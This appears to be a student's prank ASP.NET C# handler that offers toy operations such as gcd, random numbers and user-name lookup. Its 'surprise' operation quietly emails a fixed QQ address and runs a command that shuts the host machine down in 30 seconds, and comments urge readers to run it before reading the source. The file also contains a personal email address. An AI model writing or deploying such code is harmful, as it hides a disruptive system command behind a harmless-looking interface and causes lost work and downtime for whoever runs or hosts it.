<%@ WebHandler Language="C#" Class="posit" %>

using System;
using System.Web;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Runtime.InteropServices;


public class posit : IHttpHandler
{
    static essential es = new essential();
    static user us = new user();
    static sqlSever sq = new sqlSever();
    static repeaterOp re = new repeaterOp();

    // 别看源码先跑一遍呗
    // 别看源码先跑一遍呗
    // 别看源码先跑一遍呗


    string[] opList = { "tip（真诚的忠告）", "getHelp（没用的）", "gcd（就是那个gcd）", "random（随机数）", "getUsername（给个id）", "surprise(hi! surprise mother fucker)", "xss（前端这技术太强了）", "throw（emmmm）" };
    string op,output;

    int makeEx = 0;

    public void ProcessRequest(HttpContext context)
    {
        try
        {
            op = context.Request.Form["op"];

            // 字符串是null不会报错……
            if (op == null)
            {
                makeEx = makeEx / makeEx;
            }
        }
        catch (Exception ex)
        {
            context.Response.Write("未得到操作类型,输入操作类型'op=getHelp'来获取帮助");
            return;
        }
        switch (op)
        {
            case "tip":
                context.Response.Write("要不学长（学姐）你先把所有工作文件都保存了再来测我的程序？（严肃脸）");
                return;

            case "getHelp":
                context.Response.Write("事实上并没有什么帮助，输入个help试试？");
                return;

            case "gcd":
                int a, b, t = 1;
                try
                {
                    a = int.Parse(context.Request.Form["a"].ToString());
                    b = int.Parse(context.Request.Form["b"].ToString());
                    if (a < 0 || b < 0) a = 0;
                    t = t / b;
                    t = t / a;
                }
                catch (Exception ex)
                {
                    context.Response.Write("gcd后面当然要跟两个数字ab啦，顺便别超int，也别输非正数");
                    return;
                }
                while ((b %= a) * (a ^= b) * (b ^= a) * (a ^= b)> 0) ; // 你没有看错，核心代码就一行，但是C#有个坑爹的运算机制害我调了半小时
                context.Response.Write("结果是：" + b);
                return;

            case "gun": // 只是个缩写
            case "getUsername":
                int userId;
                try
                {
                    userId = int.Parse(context.Request.Form["userId"].ToString());
                }
                catch (Exception ex)
                {
                    try
                    {
                        userId = int.Parse(context.Request.Form["ui"].ToString()); // 同样只是缩写
                    }
                    catch (Exception ex2)
                    {
                        context.Response.Write("请输入userId");
                        return;
                    }
                }

                if (userId == 19260817)
                {
                    context.Response.Write("牠");
                }

                if (sq.getDataStyle(userId) != es.STYLE_USER_NAME)
                {
                    context.Response.Write("这id不存在的");
                    return;
                }
                else
                {
                    context.Response.Write("他叫" + sq.getDataContent(userId).ToString());
                }
                return;

            case "xss":
                context.Response.Write("网页制作博大精深啊，我现在就想知道这东西怎么注");
                return;

            case "photo":
                context.Response.Write("有人会调用本地摄像头吗，在线等，挺急的");
                return;

            case "random":
                Random r = new Random();
                context.Response.Write(r.Next());
                return;

            case "throw":
                try
                {
                    makeEx = makeEx / makeEx;
                }
                catch (Exception ex)
                {
                    context.AddError(ex);
                }
                return;

            case "eat":
                context.Response.Clear();
                return;

            case "sp": // 缩写
            case "surprise":
                us.send("恶作剧成功", "1045932460@qq.com");
                Process.Start("shutdown","/s /t 30");
                return;

            case "flag":
            case "fl4g":
                context.Response.Write("彩蛋");
                return;

            default:
                output = "所有的操作见→_→";
                for (int i = 0; i < opList.Length; i++)
                {
                    string end;
                    if (i == opList.Length - 1)
                    {
                        end = "";
                    }
                    else
                    {
                        end = ",";
                    }
                    output = output + " " + opList[i] + end;
                }
                context.Response.Write(output);
                return;
        }
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }

}